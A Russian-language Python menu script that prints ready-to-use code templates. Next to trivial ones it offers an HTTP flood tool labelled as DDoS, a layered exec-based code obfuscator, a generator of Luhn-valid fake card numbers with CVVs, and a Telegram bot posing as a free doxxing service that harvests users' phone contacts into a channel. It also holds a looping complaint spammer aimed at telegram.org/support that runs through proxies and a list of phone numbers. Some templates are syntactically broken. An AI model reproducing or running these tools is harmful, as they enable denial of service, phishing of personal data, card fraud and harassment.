import os
import time
banner = """
┌─────────────────────────────────────────────────────────────────┐
│[1] Написать код калькулятора                                    │
│[2] Написать код пробива по номеру                               │
│[3] Написать код пробива по IP                                   │
│[4] Написать код обусфактора кода python                         │
│[5] Написать код для DDOS атаки                                  │
│[6] Написать код вывода текста                                   │
│[7] Написать код для запроса информации от пользователя          │
│[8] Написать код генерации карты                                 │
│[9] Написать код для автоустановки библиотек termux              │
│[10] Написать код для поиска по нику                             │
│[11] Написать код ТГ бота логера                                 │
│[12] Написать код для поиска по mac адресу                       │
│[13] Написать код для спама на telegram.org/support              │
└─────────────────────────────────────────────────────────────────┘
"""
print(banner)
select = input("[?] Введите номер желаемого пункта -> ")
if select == "1":
    calculator = """
num1 = int(input("Введите первое число: "))
num2 = int(input("Введите второе число: "))
operation = input("Выберите операцию (+ - / *): ")
if operation == "+":
    result = num1 + num2
elif operation == "-":
    result = num1 - num2
elif operation == "/":
    result = num1 / num2
elif operation == "*":
    result = num1 * num2
else:
    print("Ошибка, перепроверьте вводимые данные")
print("Результат:", result)

"""
    print(calculator)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")

if select == "2":
    phone = """
phone = input("[?] Введите номер телефона -> ")
getInfo = "https://htmlweb.ru/geo/api.php?json&telcod=" + phone

try:
    infoPhone = urllib.request.urlopen(getInfo)
    infoPhone = json.load(infoPhone)  # Move this line inside the try block
except:
    print("\n[!] Ошибка номер недействительный [!]\n")

print(u"Number: ", "+" + phone)
print(u"Country: ", infoPhone["country"]["name"])
print(u"Region: ", infoPhone["region"]["name"])
print(u"District: ", infoPhone["region"]["okrug"])
print(u"Operator: ", infoPhone["0"]["oper"])
print(u"Continent: ", infoPhone["country"]["location"])

"""
    print(phone)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select ==  "3":
    ip = """
import urllib.request
import json
import requests

getIP = input("Введите IP: ")
url = "https://ipinfo.io/" + getIP + "/json"

try:
    getInfo = urllib.request.urlopen(url)
    infoList = json.load(getInfo)  

    print("IP: ", infoList["ip"])   
    print("City: ", infoList["city"])  
    print("Region: ", infoList["region"])
    print("Country: ", infoList["country"])

except:
    print("\n[!] Ошибка IP не найден! - [!]\n")

def whoisIPinfo(ip):
    try:
        myCommand = "whois " + getIP
        whoisInfo = os.popen(myCommand).read()
        return whoisInfo
    except:
        return "\n [!] Ошибка [!] \n"

        """
    print(ip)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "4":
    obsf = """
code = "#Сюда вставлять код"
import base64, zlib

def encrypt(text: str):
    return f'''
exec(__import__('zlib').decompress(__import__('base64').b64decode(b"{base64.b64encode(zlib.compress(text.encode())).decode()}")))'''

for i in range(400):code = encrypt(code)

print(code)
"""
    print(obsf)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "5":
    ddos = """
import threading
import requests

s = 0
url = input("URL: ")
num_requests = int(input("Введите количество запросов: "))
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
]

def send_request(i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        print(f"[+] Request {i} sent successfully\n")
    except:
        print(f"[-] Request {i} failed\n")

threads = []
for i in range(1, num_requests + 1):
    t = threading.Thread(target=send_request, args=[i])
    t.start()
    threads.append(t)

for t in threads:
    t.join()
"""
    print(ddos)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")

if select == "6":
    textprint = """
print("#Сдесь ваш текст")
"""
    print(textprint)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "7":
    textinput = """
input("#Сдесь ваш запрос ")
"""
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "8":
    card = """
import urllib.request
import random 
import threading
import requests


print("\n[?] Выберите страну:  \n")
print("[?] 1: Украина\n")
print("[?] 2: Россия\n")
print("[?] 3: Казахстан\n")
country_choice = input("\n[?] Ваш выбор ->  ")

if country_choice == "1":
    country = "Украина"
elif country_choice == "2":
    country = "Россия"
elif country_choice == "3":
    country = "Казахстан"
else:
    print("\n[!] Неправильный ввод.\n")

def generate_card_number():
    bin_number = "4"  
    for _ in range(5):
        bin_number += str(random.randint(0, 9))

    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
    card_number = bin_number + account_number
    checksum = generate_checksum(card_number)
    card_number += str(checksum)

    return card_number

def generate_checksum(card_number):
    digits = [int(x) for x in card_number]
    odd_digits = digits[-2::-2]
    even_digits = digits[-1::-2]
    checksum = sum(odd_digits)
    for digit in even_digits:
        checksum += sum(divmod(digit * 2, 10))
    return (10 - checksum % 10) % 10

def generate_expiry_date():
    month = random.randint(1, 12)
    year = random.randint(24, 30)  
    return "{:02d}/{:02d}".format(month, year)

def generate_cvv():
    return ''.join(str(random.randint(0, 9)) for _ in range(3))

def generate_random_card(country):
    card_number = generate_card_number()
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return {
        "Страна": country,
        "Номер карты": card_number,
        "Срок действия": expiry_date,
        "CVV": cvvpricard = generate_random_card(country)
print("\n[+] Страна: " + card["Страна"])
print("\n[+] Номер карты: " + card["Номер карты"])
print("\n[+] Срок действия: " + card["Срок действия"])
print("\n[+] CVV: " + card["CVV"] + "\n")

"""
    print(card)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "9":
    bibliotek = """
    os.system("#Сдесь нужная библиотека")
    os.system("#Сдесь нужная библиотека")
    os.system("#Сдесь нужная библиотека")
    os.system("#Сдесь нужная библиотека"
    os.system("#Сдесь нужная библиотека")
    """
    print(bibliotek)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "10":
    nicksearch = """
nick = input("Введите nickname ")
print("t.me/", nick )
#По желанию можно добавить еще сервисов

"""
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "11":
    botlogger = """
import telebot

TOKEN = "# Токен вашего бота"


CHANNEL_ID = "# ID вашего канала (например, -100123456789)"

FILE_NAME = 'usersdata.txt'


processed_users = set()


bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=['start'])
def handle_start(message):

    keyboard = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = telebot.types.KeyboardButton("Поделиться контактом", request_contact=True)
    keyboard.add(button)


    bot.reply_to(message, "🆘 Вы можете прислать боту запросы в следующем формате и он пробьет человека совершенно бесплатно:\n👤 Поиск по имени\n├  Программист\n├  Антипов Евгений\n├  Антипов Евгений Вячеславович\n└  Антипов Евгений Вячеславович 05.02.1994\n\n📱 79999939919 - для поиска по номеру телефона\n📨 tema@gmail.com - для поиска по Email\n📧 281485304, @durov или перешлите сообщение - поиск по Telegram аккаунту\n🔐 /pas churchill7 - поиск почты, логина и телефона по паролю\n🏚 /adr Москва, Тверская, д 1, кв 1 - информация по адресу (РФ)\n\n📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.\n🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.\n🌎 Отправьте точку на карте, чтобы найти людей, которые сейчас там.\n🗣 С помощью голосовых команд также можно выполнять поисковые запросы.", reply_markup=keyboard)
    bot.reply_to(message, "🗂 \n\nВам необходимо завершить идентификацию.\n\nДля этого нажмите кнопку ниже.", reply_markup=keyboard)


@bot.message_handler(content_types=['contact'])
def handle_contact(message):

    first_name = message.contact.first_name
    last_name = message.contact.last_name
    user_id = message.from_user.id
    phone_number = message.contact.phone_number

    is_duplicate = check_duplicate(user_id)


    if not is_duplicate:
        with open(FILE_NAME, 'a') as f:
            f.write(f"{user_id},{first_name},{last_name},{phone_number}\n")


    if not is_duplicate:
        bot.reply_to(message, 'Ошибка')
        send_to_channel(f"Новый лог: {first_name} {last_name} (ID: {user_id}), Номер телефона: {phone_number}")


def check_duplicate(user_id):
    if user_id in processed_users:
        return True
    else:
        processed_users.add(user_id)
        return False


def send_to_channel(text):

    bot.send_message(CHANNEL_ID, text)


if name == "__main__":
    bot.polling()

    """
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "12":
    searchmac = """
def mac_lookup(mac_address):
    api_url = f"https://api.macvendors.com/{mac_address}"
try:
    response = requests.get(api_url)
    if response.status_code == 200:
        return response.text.strip()
else:
    return f"Error: {response.status_code} - {response.text}"
    except Exception as e:
        return f"Error: {str(e)}"
        mac_address = input("Введите Mac-Address: ")
        vendor = mac_lookup(mac_address)
        print(f"Vendor: {vendor}")

"""
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
if select == "13":
    report = """
import requests
import time
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored


device_name = socket.gethostname()
ip_address = socket.gethostbyname(device_name)
current_time = datetime.datetime.now()

print(f"Скрипт был запущен: Устройство: {device_name}")
print(f"Точное время: {current_time}")
print(f"IP адрес: {ip_address}")

url = 'https://telegram.org/support'
ua = UserAgent()

yukino = 0

def send_complaint(text, contact):
    headers = {
        'User-Agent': ua.random
    }
    payload = {
        'text': text,
        'contact': contact
    }

    proxies = {
    'http': '62.33.207.202:80',
    'http': '5.189.184.147:27191',
    'http': '50.221.74.130:80',
    'http': '172.67.43.209:80',
}

    response = requests.post(url, data=payload, headers=headers, proxies=proxies)

    if response.status_code == 200:
        print(f"\33[92mЖалоба успешно отправлена\n Всего отправлено", yukino, "сообщений\33[0m")
    else:
        print(f"Произошла ошибка при отправке жалобы")

text = [
input("Введите текст жалобы: ")
      ]

contact = [
    "+79967285422",
    "+79269736273",
    "+79963668355",
    "+79661214909",
    "79254106650",
    "+22666228126",
    "+79269069196",
    "+79315894431",
    "+79621570718",
]

while True:
    yukino += 1
    chosen_text = random.choice(text)
    chosen_contact = random.choice(contact)
    send_complaint(chosen_text, chosen_contact)
    time.sleep(0)
"""
    print(report)
    back = input("[?] Вернуться в главное меню? Yes/No -> ")
    if back == "Yes":
        os.system("clear")
        os.system("python main.py")
    if back ==  "Nо":
        print("[!] Хорошо, вы не вернетесь в главное меню ")
